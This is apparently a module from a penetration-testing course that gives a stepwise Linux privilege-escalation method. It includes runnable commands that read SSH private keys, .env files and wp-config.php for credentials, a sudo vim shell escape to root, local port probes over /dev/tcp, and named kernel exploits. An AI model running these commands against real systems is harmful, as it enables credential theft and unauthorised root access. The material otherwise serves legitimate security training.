# 04 — Privilege Escalation: Methodology

> Systematic step-by-step approach for escalating privileges on Linux systems.

> 📋 **What You Will Do In This Section**
> - [ ] Follow a 6-step privilege escalation methodology
> - [ ] Complete quick wins assessment in under 2 minutes
> - [ ] Hunt for credentials across configs, history, and databases
> - [ ] Monitor processes with pspy for hidden cron jobs
> - [ ] Determine when to use kernel exploits (last resort)

---

## 🔴 PrivEsc Methodology Flowchart

> 💡 **Why This Matters**
> Random guessing wastes hours. This flowchart orders privesc checks by success probability and risk level. `sudo -l` takes 5 seconds and has the highest success rate. Kernel exploits take 10 minutes and can crash the system. Follow this order every time.

```
START (Low-privilege shell)
  │
  ├─→ Step 1: Situational Awareness (30 seconds)
  │     ├── whoami / id / hostname
  │     ├── uname -a / cat /etc/os-release
  │     └── Network position (ip a, ss -tulpn)
  │
  ├─→ Step 2: Quick Wins (2 minutes)
  │     ├── sudo -l → GTFOBins lookup
  │     ├── SUID binaries → GTFOBins lookup
  │     ├── Writable /etc/passwd → Add root user
  │     └── Docker group → Container escape to root
  │
  ├─→ Step 3: Credential Hunting (5 minutes)
  │     ├── History files (~/.bash_history)
  │     ├── Config files (/var/www/.env, *.conf)
  │     ├── Database credentials
  │     ├── SSH keys (/home/*/.ssh/)
  │     └── Password reuse (try found creds for root)
  │
  ├─→ Step 4: Scheduled Tasks & Processes (5 minutes)
  │     ├── Cron jobs (crontab -l, /etc/crontab)
  │     ├── pspy (hidden cron jobs)
  │     ├── Writable scripts called by root
  │     └── PATH hijacking opportunities
  │
  ├─→ Step 5: Service Exploitation
  │     ├── MySQL running as root (UDF exploit)
  │     ├── NFS misconfig (no_root_squash)
  │     ├── Internal services on localhost
  │     └── Wildcard injection (tar, rsync)
  │
  ├─→ Step 6: Kernel Exploits (LAST RESORT)
  │     ├── linux-exploit-suggester
  │     ├── PwnKit, DirtyCow, DirtyPipe
  │     └── Compile on attacker, transfer, execute
  │
  └─→ ROOT OBTAINED
        ├── Document the escalation chain
        └── Move to post-exploitation
```

---

## 🔴 Detailed Steps

### Step 1: Situational Awareness

```bash
# Who are we?
whoami && id

# What system is this?
hostname && uname -a && cat /etc/os-release

# What's our network position?
ip a && ip route

# What's listening?
ss -tulpn

# Who else is logged in?
w && last

# What's the date/time? (important for cron analysis)
date
```

#### 🧪 Try It Now

```bash
echo "=== Step 1: Situational Awareness ==="
echo "User: $(whoami) | UID: $(id -u) | Groups: $(groups)"
echo "Host: $(hostname) | Kernel: $(uname -r)"
echo "Distro: $(cat /etc/os-release 2>/dev/null | grep PRETTY | cut -d= -f2)"
echo "IPs: $(ip -4 addr show | grep inet | grep -v 127.0.0.1 | awk '{print $2}' | tr '\n' ' ')"
echo "Listening ports: $(ss -tulpn 2>/dev/null | grep LISTEN | awk '{print $5}' | cut -d: -f2 | sort -n | uniq | tr '\n' ' ')"
```

> ✅ **Expected Output**
> A one-line summary of your identity, system, and network position.

### Step 2: Quick Wins

> 💡 **Why This Matters**
> These 4 checks take under 2 minutes and catch 60%+ of privesc vectors. If none of these work, move to the slower methods.

```bash
# 1. Sudo — THE FASTEST PATH (5 sec)
sudo -l
# If (ALL) NOPASSWD: /something → Check GTFOBins immediately

# 2. SUID binaries (10 sec)
find / -perm -4000 -type f 2>/dev/null | grep -v -E "snap|lib"
# Cross-reference each with https://gtfobins.github.io/

# 3. Writable /etc/passwd (5 sec)
ls -la /etc/passwd
[ -w /etc/passwd ] && echo "WRITABLE — GAME OVER" || echo "Protected"

# 4. Docker group (5 sec)
id | grep docker && echo "IN DOCKER GROUP — ROOT TRIVIAL"
```

#### 🧪 Try It Now — Complete Quick Wins Check

```bash
echo "=== Step 2: Quick Wins ==="
echo ""
echo "--- sudo -l ---"
sudo -l 2>/dev/null | tail -3 || echo "  Cannot check sudo"
echo ""
echo "--- Non-standard SUID ---"
find / -perm -4000 -type f 2>/dev/null | grep -v -E "snap|/lib|bin/(su|passwd|mount|umount|chsh|chfn|newgrp|gpasswd|ping|sudo)" | head -5 || echo "  None found"
echo ""
echo "--- Writable /etc/passwd ---"
[ -w /etc/passwd ] && echo "  ⚠️  YES!" || echo "  ✅ No"
echo ""
echo "--- Docker group ---"
id | grep -q docker && echo "  ⚠️  In docker group!" || echo "  ✅ Not in docker group"
```

### Step 3: Credential Hunting

```bash
# History files
cat ~/.bash_history 2>/dev/null | grep -iE "pass|ssh|mysql|psql|su |sudo"
cat ~/.mysql_history 2>/dev/null

# Environment variables
env | grep -iE "pass|key|secret|token|cred"

# Config files with passwords
grep -rn "password\|passwd\|pass\|pwd" /var/www/ /opt/ /etc/ /home/ 2>/dev/null | grep -v "Binary" | head -20
find / -name "*.conf" -o -name ".env" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null

# Database credentials
cat /var/www/html/wp-config.php 2>/dev/null | grep -i "db_"
cat /var/www/html/.env 2>/dev/null | grep -i "pass\|secret\|key"

# Try password reuse
su root  # Try every password you've found
```

### Step 4: Scheduled Tasks & Process Analysis

```bash
# System cron
cat /etc/crontab | grep -v "^#" | grep -v "^$"
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null

# Check if cron scripts are writable
find /etc/cron* -writable -type f 2>/dev/null

# Monitor processes for hidden cron jobs
./pspy64  # Let it run for 5 minutes

# Look for wildcard injection
cat /etc/crontab | grep -E "tar|rsync|chown|chmod"
```

### Step 5: Service-Based Escalation

```bash
# MySQL running as root
mysql -u root 2>/dev/null
mysql -u root -p'password' 2>/dev/null

# NFS shares
cat /etc/exports 2>/dev/null | grep no_root_squash

# Internal web services
for port in 80 3000 5000 8080 8443 9200; do
  (echo > /dev/tcp/127.0.0.1/$port) 2>/dev/null && echo "Port $port: OPEN"
done
```

---

## 📋 Priority Order

| Priority | Check | Time | Success Rate |
|----------|-------|------|-------------|
| 1 | `sudo -l` | 5 sec | Very High |
| 2 | SUID binaries | 10 sec | High |
| 3 | Writable /etc/passwd | 5 sec | If writable: 100% |
| 4 | Credential files | 2 min | High |
| 5 | Cron jobs | 2 min | Medium |
| 6 | Docker group | 5 sec | If member: 100% |
| 7 | Capabilities | 10 sec | Medium |
| 8 | PATH hijacking | 5 min | Medium |
| 9 | Kernel exploits | 10 min | Varies (risky) |

---

## 📋 PrivEsc Report Template

```markdown
## Privilege Escalation Finding

### Initial Access
- User: www-data
- Shell type: Reverse shell via web exploitation
- Access level: Low-privilege (no sudo, no SUID)

### Enumeration Results
- sudo -l: (user) NOPASSWD: /usr/bin/vim
- SUID: Standard binaries only
- Cron: Root runs /opt/backup.sh (world-writable)
- Kernel: 5.4.0-42-generic

### Escalation Path
1. Found `sudo -l` allows vim without password
2. Ran `sudo vim -c ':!/bin/sh'`
3. Obtained root shell

### Evidence
$ sudo vim -c ':!/bin/sh'
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)

### Impact
Full system compromise. Attacker can access all files,
install persistence, and pivot to internal network.

### Remediation
1. Remove unnecessary sudo permissions
2. Use sudoers with specific command restrictions
3. Enable sudo logging
```

---

## 🧠 If You're Stuck

1. **No sudo, no SUID, no writable files**: Run LinPEAS — it checks 100+ vectors you might miss manually
2. **LinPEAS shows nothing red**: Monitor with pspy for 5+ minutes — there might be hourly cron jobs
3. **Found credentials but can't use them**: Try password reuse with `su root`, SSH, MySQL, and any other service
4. **Kernel exploit crashes the system**: Always test on a matching lab system first. Use `linux-exploit-suggester` to verify compatibility
5. **In a container**: Check for Docker socket (`/var/run/docker.sock`) or try container escape techniques
